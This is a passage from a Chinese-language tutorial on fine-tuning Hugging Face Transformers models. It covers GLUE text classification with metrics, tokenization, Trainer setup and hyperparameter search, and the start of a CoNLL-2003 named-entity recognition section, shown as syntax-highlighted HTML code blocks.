class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python">Metric(name: <span class="hljs-string">&quot;glue&quot;</span>, features: &#123;<span class="hljs-string">&#x27;predictions&#x27;</span>: Value(dtype=<span class="hljs-string">&#x27;int64&#x27;</span>, <span class="hljs-built_in">id</span>=<span class="hljs-literal">None</span>), <span class="hljs-string">&#x27;references&#x27;</span>: Value(dtype=<span class="hljs-string">&#x27;int64&#x27;</span>, <span class="hljs-built_in">id</span>=<span class="hljs-literal">None</span>)&#125;, usage: <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Compute GLUE evaluation metric associated to each GLUE dataset.</span><br><span class="hljs-string">Args:</span><br><span class="hljs-string">    predictions: list of predictions to score.</span><br><span class="hljs-string">        Each translation should be tokenized into a list of tokens.</span><br><span class="hljs-string">    references: list of lists of references for each translation.</span><br><span class="hljs-string">        Each reference should be tokenized into a list of tokens.</span><br><span class="hljs-string">Returns: depending on the GLUE subset, one or several of:</span><br><span class="hljs-string">    &quot;accuracy&quot;: Accuracy</span><br><span class="hljs-string">    &quot;f1&quot;: F1 score</span><br><span class="hljs-string">    &quot;pearson&quot;: Pearson Correlation</span><br><span class="hljs-string">    &quot;spearmanr&quot;: Spearman Correlation</span><br><span class="hljs-string">    &quot;matthews_correlation&quot;: Matthew Correlation</span><br><span class="hljs-string">Examples:</span><br><span class="hljs-string"></span><br><span class="hljs-string">    &gt;&gt;&gt; glue_metric = datasets.load_metric(&#x27;glue&#x27;, &#x27;sst2&#x27;)  # &#x27;sst2&#x27; or any of [&quot;mnli&quot;, &quot;mnli_mismatched&quot;, &quot;mnli_matched&quot;, &quot;qnli&quot;, &quot;rte&quot;, &quot;wnli&quot;, &quot;hans&quot;]</span><br><span class="hljs-string">    &gt;&gt;&gt; references = [0, 1]</span><br><span class="hljs-string">    &gt;&gt;&gt; predictions = [0, 1]</span><br><span class="hljs-string">    &gt;&gt;&gt; results = glue_metric.compute(predictions=predictions, references=references)</span><br><span class="hljs-string">    &gt;&gt;&gt; print(results)</span><br><span class="hljs-string">    &#123;&#x27;accuracy&#x27;: 1.0&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    &gt;&gt;&gt; glue_metric = datasets.load_metric(&#x27;glue&#x27;, &#x27;mrpc&#x27;)  # &#x27;mrpc&#x27; or &#x27;qqp&#x27;</span><br><span class="hljs-string">    &gt;&gt;&gt; references = [0, 1]</span><br><span class="hljs-string">    &gt;&gt;&gt; predictions = [0, 1]</span><br><span class="hljs-string">    &gt;&gt;&gt; results = glue_metric.compute(predictions=predictions, references=references)</span><br><span class="hljs-string">    &gt;&gt;&gt; print(results)</span><br><span class="hljs-string">    &#123;&#x27;accuracy&#x27;: 1.0, &#x27;f1&#x27;: 1.0&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    &gt;&gt;&gt; glue_metric = datasets.load_metric(&#x27;glue&#x27;, &#x27;stsb&#x27;)</span><br><span class="hljs-string">    &gt;&gt;&gt; references = [0., 1., 2., 3., 4., 5.]</span><br><span class="hljs-string">    &gt;&gt;&gt; predictions = [0., 1., 2., 3., 4., 5.]</span><br><span class="hljs-string">    &gt;&gt;&gt; results = glue_metric.compute(predictions=predictions, references=references)</span><br><span class="hljs-string">    &gt;&gt;&gt; print(&#123;&quot;pearson&quot;: round(results[&quot;pearson&quot;], 2), &quot;spearmanr&quot;: round(results[&quot;spearmanr&quot;], 2)&#125;)</span><br><span class="hljs-string">    &#123;&#x27;pearson&#x27;: 1.0, &#x27;spearmanr&#x27;: 1.0&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    &gt;&gt;&gt; glue_metric = datasets.load_metric(&#x27;glue&#x27;, &#x27;cola&#x27;)</span><br><span class="hljs-string">    &gt;&gt;&gt; references = [0, 1]</span><br><span class="hljs-string">    &gt;&gt;&gt; predictions = [0, 1]</span><br><span class="hljs-string">    &gt;&gt;&gt; results = glue_metric.compute(predictions=predictions, references=references)</span><br><span class="hljs-string">    &gt;&gt;&gt; print(results)</span><br><span class="hljs-string">    &#123;&#x27;matthews_correlation&#x27;: 1.0&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>, stored examples: <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#  直接调用metric的compute方法，传入labels和predictions即可得到metric的值</span><br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>fake_preds = np.random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, size=(<span class="hljs-number">64</span>,))<br>fake_labels = np.random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, size=(<span class="hljs-number">64</span>,))<br>metric.compute(predictions=fake_preds, references=fake_labels)<br></code></pre></td></tr></table></figure><p>每一个文本分类任务所对应的metic有所不同，具体如下:</p><ul><li>for CoLA: <ahref="https://en.wikipedia.org/wiki/Matthews_correlation_coefficient">MatthewsCorrelation Coefficient</a></li><li>for MNLI (matched or mismatched): Accuracy</li><li>for MRPC: Accuracy and <ahref="https://en.wikipedia.org/wiki/F1_score">F1 score</a></li><li>for QNLI: Accuracy</li><li>for QQP: Accuracy and <ahref="https://en.wikipedia.org/wiki/F1_score">F1 score</a></li><li>for RTE: Accuracy</li><li>for SST-2: Accuracy</li><li>for STS-B: <ahref="https://en.wikipedia.org/wiki/Pearson_correlation_coefficient">PearsonCorrelation Coefficient</a> and <ahref="https://en.wikipedia.org/wiki/Spearman&#39;s_rank_correlation_coefficient">Spearman's_Rank_Correlation_Coefficient</a></li><li>for WNLI: Accuracy</li></ul><h3 id="数据预处理">数据预处理</h3><p>预处理的工具叫<code>Tokenizer</code>。<code>Tokenizer</code>首先对输入进行tokenize，然后将tokens转化为预模型中需要对应的tokenID，再转化为模型需要的输入格式。</p><p>为了达到数据预处理的目的，我们使用<code>AutoTokenizer.from_pretrained</code>方法实例化我们的tokenizer，这样可以确保：</p><ul><li>我们得到一个与预训练模型一一对应的tokenizer。</li><li>使用指定的模型checkpoint对应的tokenizer的时候，我们也下载了模型需要的词表库vocabulary，准确来说是tokensvocabulary。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> AutoTokenizer<br>    <br>tokenizer = AutoTokenizer.from_pretrained(model_checkpoint, use_fast=<span class="hljs-literal">True</span>)<br><span class="hljs-comment">#  use_fast=True要求tokenizer必须是transformers.PreTrainedTokenizerFast类型，因为我们在预处理的时候需要用到fast tokenizer的一些特殊特性（比如多线程快速tokenizer）。如果对应的模型没有fast tokenizer，去掉这个选项即可</span><br></code></pre></td></tr></table></figure><p>tokenizer既可以对单个文本进行预处理，也可以对一对文本进行预处理，tokenizer预处理后得到的数据满足预训练模型输入格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">tokenizer(<span class="hljs-string">&quot;Hello, this one sentence!&quot;</span>, <span class="hljs-string">&quot;And this sentence goes with it.&quot;</span>)<br></code></pre></td></tr></table></figure><p>不同数据和对应的数据格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">task_to_keys = &#123;<br>    <span class="hljs-string">&quot;cola&quot;</span>: (<span class="hljs-string">&quot;sentence&quot;</span>, <span class="hljs-literal">None</span>),<br>    <span class="hljs-string">&quot;mnli&quot;</span>: (<span class="hljs-string">&quot;premise&quot;</span>, <span class="hljs-string">&quot;hypothesis&quot;</span>),<br>    <span class="hljs-string">&quot;mnli-mm&quot;</span>: (<span class="hljs-string">&quot;premise&quot;</span>, <span class="hljs-string">&quot;hypothesis&quot;</span>),<br>    <span class="hljs-string">&quot;mrpc&quot;</span>: (<span class="hljs-string">&quot;sentence1&quot;</span>, <span class="hljs-string">&quot;sentence2&quot;</span>),<br>    <span class="hljs-string">&quot;qnli&quot;</span>: (<span class="hljs-string">&quot;question&quot;</span>, <span class="hljs-string">&quot;sentence&quot;</span>),<br>    <span class="hljs-string">&quot;qqp&quot;</span>: (<span class="hljs-string">&quot;question1&quot;</span>, <span class="hljs-string">&quot;question2&quot;</span>),<br>    <span class="hljs-string">&quot;rte&quot;</span>: (<span class="hljs-string">&quot;sentence1&quot;</span>, <span class="hljs-string">&quot;sentence2&quot;</span>),<br>    <span class="hljs-string">&quot;sst2&quot;</span>: (<span class="hljs-string">&quot;sentence&quot;</span>, <span class="hljs-literal">None</span>),<br>    <span class="hljs-string">&quot;stsb&quot;</span>: (<span class="hljs-string">&quot;sentence1&quot;</span>, <span class="hljs-string">&quot;sentence2&quot;</span>),<br>    <span class="hljs-string">&quot;wnli&quot;</span>: (<span class="hljs-string">&quot;sentence1&quot;</span>, <span class="hljs-string">&quot;sentence2&quot;</span>),<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#  对数据格式进行检查</span><br>sentence1_key, sentence2_key = task_to_keys[task]<br><span class="hljs-keyword">if</span> sentence2_key <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Sentence: <span class="hljs-subst">&#123;dataset[<span class="hljs-string">&#x27;train&#x27;</span>][<span class="hljs-number">0</span>][sentence1_key]&#125;</span>&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Sentence 1: <span class="hljs-subst">&#123;dataset[<span class="hljs-string">&#x27;train&#x27;</span>][<span class="hljs-number">0</span>][sentence1_key]&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Sentence 2: <span class="hljs-subst">&#123;dataset[<span class="hljs-string">&#x27;train&#x27;</span>][<span class="hljs-number">0</span>][sentence2_key]&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p><strong>预处理函数</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">preprocess_function</span>(<span class="hljs-params">examples</span>):<br>    <span class="hljs-keyword">if</span> sentence2_key <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> tokenizer(examples[sentence1_key], truncation=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">return</span> tokenizer(examples[sentence1_key], examples[sentence2_key], truncation=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>接下来对数据集datasets里面的所有样本进行预处理，处理的方式是使用map函数，将预处理函数prepare_train_features应用到（map)所有样本上。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">encoded_dataset = dataset.<span class="hljs-built_in">map</span>(preprocess_function, batched=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>返回的结果会自动被缓存，避免下次处理的时候重新计算（但是也要注意，如果输入有改动，可能会被缓存影响！）。datasets库函数会对输入的参数进行检测，判断是否有变化，如果没有变化就使用缓存数据，如果有变化就重新处理。但如果输入参数不变，想改变输入的时候，最好清理调这个缓存。清理的方式是使用<code>load_from_cache_file=False</code>参数。另外，上面使用到的<code>batched=True</code>这个参数是tokenizer的特点，因为这会使用多线程同时并行对输入进行处理。</p><h3 id="微调预训练模型">微调预训练模型</h3><p>既然我们是做seq2seq任务，那么我们需要一个能解决这个任务的模型类。我们使用<code>AutoModelForSequenceClassification</code>这个类。和tokenizer相似，<code>from_pretrained</code>方法同样可以帮助我们下载并加载模型，同时也会对模型进行缓存，就不会重复下载模型啦。</p><p>STS-B是一个回归问题，MNLI是一个3分类问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#  对sts，mnli问题进行处理</span><br><span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> AutoModelForSequenceClassification, TrainingArguments, Trainer<br><br>num_labels = <span class="hljs-number">3</span> <span class="hljs-keyword">if</span> task.startswith(<span class="hljs-string">&quot;mnli&quot;</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">1</span> <span class="hljs-keyword">if</span> task==<span class="hljs-string">&quot;stsb&quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-number">2</span><br>model = AutoModelForSequenceClassification.from_pretrained(model_checkpoint, num_labels=num_labels)<br></code></pre></td></tr></table></figure><p>为了能够得到一个<code>Trainer</code>训练工具，我们还需要3个要素，其中最重要的是训练的设定/参数<ahref="https://huggingface.co/transformers/main_classes/trainer.html#transformers.TrainingArguments"><code>TrainingArguments</code></a>。这个训练设定包含了能够定义训练过程的所有属性。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">metric_name = <span class="hljs-string">&quot;pearson&quot;</span> <span class="hljs-keyword">if</span> task == <span class="hljs-string">&quot;stsb&quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;matthews_correlation&quot;</span> <span class="hljs-keyword">if</span> task == <span class="hljs-string">&quot;cola&quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;accuracy&quot;</span><br><br>args = TrainingArguments(<br>    <span class="hljs-string">&quot;test-glue&quot;</span>,<br>    evaluation_strategy = <span class="hljs-string">&quot;epoch&quot;</span>,  <span class="hljs-comment"># 每个epcoh会做一次验证评估</span><br>    save_strategy = <span class="hljs-string">&quot;epoch&quot;</span>,<br>    learning_rate=<span class="hljs-number">2e-5</span>,<br>    per_device_train_batch_size=batch_size,<br>    per_device_eval_batch_size=batch_size,<br>    num_train_epochs=<span class="hljs-number">5</span>,<br>    weight_decay=<span class="hljs-number">0.01</span>,<br>    load_best_model_at_end=<span class="hljs-literal">True</span>,<br>    metric_for_best_model=metric_name,<br>)<br></code></pre></td></tr></table></figure><p>由于不同的任务需要不同的评测指标，我们定一个函数来根据任务名字得到评价方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">compute_metrics</span>(<span class="hljs-params">eval_pred</span>):<br>    predictions, labels = eval_pred<br>    <span class="hljs-keyword">if</span> task != <span class="hljs-string">&quot;stsb&quot;</span>:<br>        predictions = np.argmax(predictions, axis=<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">else</span>:<br>        predictions = predictions[:, <span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">return</span> metric.compute(predictions=predictions, references=labels)<br></code></pre></td></tr></table></figure><p>全部传给 <code>Trainer</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">validation_key = <span class="hljs-string">&quot;validation_mismatched&quot;</span> <span class="hljs-keyword">if</span> task == <span class="hljs-string">&quot;mnli-mm&quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;validation_matched&quot;</span> <span class="hljs-keyword">if</span> task == <span class="hljs-string">&quot;mnli&quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;validation&quot;</span><br>trainer = Trainer(<br>    model,<br>    args,<br>    <span class="hljs-attribute">train_dataset</span>=encoded_dataset[<span class="hljs-string">&quot;train&quot;</span>],<br>    <span class="hljs-attribute">eval_dataset</span>=encoded_dataset[validation_key],<br>    <span class="hljs-attribute">tokenizer</span>=tokenizer,<br>    <span class="hljs-attribute">compute_metrics</span>=compute_metrics<br>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#  开始训练</span><br>trainer.train()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#  训练完成后进行评估</span><br>trainer.evaluate()<br></code></pre></td></tr></table></figure><h3 id="超参数搜索">超参数搜索</h3><p><code>Trainer</code>同样支持超参搜索，使用<ahref="https://optuna.org/">optuna</a> or <ahref="https://docs.ray.io/en/latest/tune/">Ray Tune</a>代码库。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"> 安装相关依赖</span><br>! pip install optuna<br>! pip install ray[tune]<br></code></pre></td></tr></table></figure><p>超参搜索时，<code>Trainer</code>将会返回多个训练好的模型，所以需要传入一个定义好的模型从而让<code>Trainer</code>可以不断重新初始化该传入的模型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">model_init</span>():<br>    <span class="hljs-keyword">return</span> AutoModelForSequenceClassification.from_pretrained(model_checkpoint, num_labels=num_labels)<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">trainer = Trainer(<br>    <span class="hljs-attribute">model_init</span>=model_init,<br>    <span class="hljs-attribute">args</span>=args,<br>    <span class="hljs-attribute">train_dataset</span>=encoded_dataset[<span class="hljs-string">&quot;train&quot;</span>],<br>    <span class="hljs-attribute">eval_dataset</span>=encoded_dataset[validation_key],<br>    <span class="hljs-attribute">tokenizer</span>=tokenizer,<br>    <span class="hljs-attribute">compute_metrics</span>=compute_metrics<br>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#  调用方法hyperparameter_search,hyperparameter_search会返回效果最好的模型相关的参数,这个过程需要很久，我们可以先用部分数据集进行超参搜索，再进行全量训练。 这里使用1/10的数据进行搜索。</span><br>best_run = trainer.hyperparameter_search(n_trials=<span class="hljs-number">10</span>, direction=<span class="hljs-string">&quot;maximize&quot;</span>)<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#  将Trainner设置为搜索到的最好的参数，进行训练</span><br><span class="hljs-keyword">for</span> n, v <span class="hljs-keyword">in</span> best_run.hyperparameters.items():<br>    <span class="hljs-built_in">setattr</span>(trainer.args, n, v)<br><br>trainer.train()<br></code></pre></td></tr></table></figure><h2 id="序列标注">序列标注</h2><p>序列标注，通常也可以看作是token级别的分类问题：对每一个token进行分类。在这个notebook中，我们将展示如何使用<ahref="https://github.com/huggingface/transformers">🤗Transformers</a>中的transformer模型去做token级别的分类问题。</p><p>最常见的token级别分类任务:</p><ul><li>NER (Named-entity recognition 名词-实体识别)分辨出文本中的名词和实体 (person人名, organization组织机构名,location地点名...).</li><li>POS (Part-of-speech tagging词性标注) 根据语法对token进行词性标注(noun名词, verb动词, adjective形容词...)</li><li>Chunk (Chunking短语组块) 将同一个短语的tokens组块放在一起。</li></ul><p>对于以上任务，我们将展示如何使用简单的Dataset库加载数据集，同时使用transformer中的<code>Trainer</code>接口对预训练模型进行微调。</p><p>只要预训练的transformer模型最顶层有一个token分类的神经网络层（比如上一篇章提到的<code>BertForTokenClassification</code>）（另外，由于transformer库的tokenizer新特性，可能还需要对应的预训练模型有fasttokenizer这个功能，参考<ahref="https://huggingface.co/transformers/index.html#bigtable">这个表</a>），那么本notebook理论上可以使用各种各样的transformer模型（<ahref="https://huggingface.co/models">模型面板</a>），解决任何token级别的分类任务。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">task = <span class="hljs-string">&quot;ner&quot;</span> <span class="hljs-comment">#需要是&quot;ner&quot;, &quot;pos&quot; 或者 &quot;chunk&quot;</span><br>model_checkpoint = <span class="hljs-string">&quot;distilbert-base-uncased&quot;</span><br>batch_size = <span class="hljs-number">16</span><br></code></pre></td></tr></table></figure><h3 id="加载数据-1">加载数据</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> datasets <span class="hljs-keyword">import</span> load_dataset, load_metric<br>datasets = load_dataset(<span class="hljs-string">&#x27;conll2003&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#  Dataset结构</span><br>DatasetDict(&#123;<br>    train: Dataset(&#123;<br>        features: [<span class="hljs-string">&#x27;id&#x27;</span>, <span class="hljs-string">&#x27;tokens&#x27;</span>, <span class="hljs-string">&#x27;pos_tags&#x27;</span>, <span class="hljs-string">&#x27;chunk_tags&#x27;</span>, <span class="hljs-string">&#x27;ner_tags&#x27;</span>],<br>        num_rows: <span class="hljs-number">14041</span><br>    &#125;)<br>    validation: Dataset(&#123;<br>        features: [<span class="hljs-string">&#x27;id&#x27;</span>, <span class="hljs-string">&#x27;tokens&#x27;</span>, <span class="hljs-string">&#x27;pos_tags&#x27;</span>, <span class="hljs-string">&#x27;chunk_tags&#x27;</span>, <span class="hljs-string">&#x27;ner_tags&#x27;</span>],<br>        num_rows: <span class="hljs-number">3250</span><br>    &#125;)<br>    test: Dataset(&#123;<br>        features: [<span class="hljs-string">&#x27;id&#x27;</span>, <span class="hljs-string">&#x27;tokens&#x27;</span>, <span class="hljs-string">&#x27;pos_tags&#x27;</span>, <span class="hljs-string">&#x27;chunk_tags&#x27;</span>, <span class="hljs-string">&#x27;ner_tags&#x27;</span>],<br>        num_rows: <span class="hljs-number">3453</span><br>    &#125;)<br>&#125;)<br></code></pre></td></tr></table></figure><p>无论是在训练集、验证机还是测试集中，datasets都包含了一个名为tokens的列（一般来说是将文本切分成了很多词），还包含一个名为label的列，这一列对应这tokens的标注。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">datasets[<span class="hljs-string">&quot;train&quot;</span>][<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<span class="hljs-string">&#x27;chunk_tags&#x27;</span>: [<span class="hljs-number">11</span>, <span class="hljs-number">21</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0</span>],<br> <span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br> <span class="hljs-string">&#x27;ner_tags&#x27;</span>: [<span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],<br> <span class="hljs-string">&#x27;pos_tags&#x27;</span>: [<span class="hljs-number">22</span>, <span class="hljs-number">42</span>, <span class="hljs-number">16</span>, <span class="hljs-number">21</span>, <span class="hljs-number">35</span>, <span class="hljs-number">37</span>, <span class="hljs-number">16</span>, <span class="hljs-number">21</span>, <span class="hljs-number">7</span>],<br> <span class="hljs-string">&#x27;tokens&#x27;</span>: [<span class="hljs-string">&#x27;EU&#x27;</span>,<br>  <span class="hljs-string">&#x27;rejects&#x27;</span>,<br>  <span class="hljs-string">&#x27;German&#x27;</span>,<br>  <span class="hljs-string">&#x27;call&#x27;</span>,<br>  <span class="hljs-string">&#x27;to&#x27;</span>,<br>  <span class="hljs-string">&#x27;boycott&#x27;</span>,<br>  <span class="hljs-string">&#x27;British&#x27;</span>,<br>  <span class="hljs-string">&#x27;lamb&#x27;</span>,<br>  <span class="hljs-string">&#x27;.&#x27;</span>]&#125;<br></code></pre></td></tr></table></figure><p>所有的数据标签labels都已经被编码成了整数，可以直接被预训练transformer模型使用。这些整数的编码所对应的实际类别储存在<code>features</code>中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">datasets[<span class="hljs-string">&quot;train&quot;</span>].features[<span class="hljs-string">f&quot;ner_tags&quot;</span>]<br><span class="hljs-type">Sequence</span>(feature=ClassLabel(num_classes=<span class="hljs-number">9</span>, names=[<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;B-PER&#x27;</span>, <span class="hljs-string">&#x27;I-PER&#x27;</span>, <span class="hljs-string">&#x27;B-ORG&#x27;</span>, <span class="hljs-string">&#x27;I-ORG&#x27;</span>, <span class="hljs-string">&#x27;B-LOC&#x27;</span>, <span class="hljs-string">&#x27;I-LOC&#x27;</span>, <span class="hljs-string">&#x27;B-MISC&#x27;</span>, <span class="hljs-string">&#x27;I-MISC&#x27;</span>], names_file=<span class="hljs-literal">None</span>, <span class="hljs-built_in">id</span>=<span class="hljs-literal">None</span>), length=-<span class="hljs-number">1</span>, <span class="hljs-built_in">id</span>=<span class="hljs-literal">None</span>)<br><br></code></pre></td></tr></table></figure><p>所以以NER为例，0对应的标签类别是”O“，1对应的是”B-PER“等等。”O“的意思是没有特别实体（no specialentity）。本例包含4种实体类别分别是（PER、ORG、LOC，MISC），每一种实体类别又分别有B-（实体开始的token）前缀和I-（实体中间的token）前缀。</p><ul><li>'PER' for person</li><li>'ORG' for organization</li><li>'LOC' for location</li><li>'MISC' for miscellaneous</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">label_list = datasets[<span class="hljs-string">&quot;train&quot;</span>].features[<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;task&#125;</span>_tags&quot;</span>].feature.names<br>label_list<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">[<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;B-PER&#x27;</span>, <span class="hljs-string">&#x27;I-PER&#x27;</span>, <span class="hljs-string">&#x27;B-ORG&#x27;</span>, <span class="hljs-string">&#x27;I-ORG&#x27;</span>, <span class="hljs-string">&#x27;B-LOC&#x27;</span>, <span class="hljs-string">&#x27;I-LOC&#x27;</span>, <span class="hljs-string">&#x27;B-MISC&#x27;</span>, <span class="hljs-string">&#x27;I-MISC&#x27;</span>]<br><br></code></pre></td></tr></table></figure><p>从数据集里随机选择几个例子进行展示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 